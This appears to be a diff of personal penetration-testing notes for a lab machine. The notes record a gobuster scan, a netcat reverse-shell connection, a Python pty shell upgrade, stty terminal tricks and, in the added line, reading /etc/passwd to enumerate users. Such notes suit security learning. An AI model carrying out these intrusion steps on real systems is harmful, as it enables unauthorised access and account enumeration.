@@ -207,5 +207,6 @@ gobuster dir -u http://192.168.64.134 -w /usr/share/wordlists/rockyou.txt
     3 cnnection succesful via nc on attacker machine
     4 upgraded shell access to more stable version - python -c 'import pty; pty.spawn("/bin/sh")'
     5 on separate terminal set stty raw -echo | to allow reverse shell to behave more like a normal terminal | stty sane on normal terminal to break out and reset.
-    6 
+    6 cat /etc/passwd file to view the users on server to enumerate if we can possbily access any. Noted Grimmie had an executable script.
+    7 
 
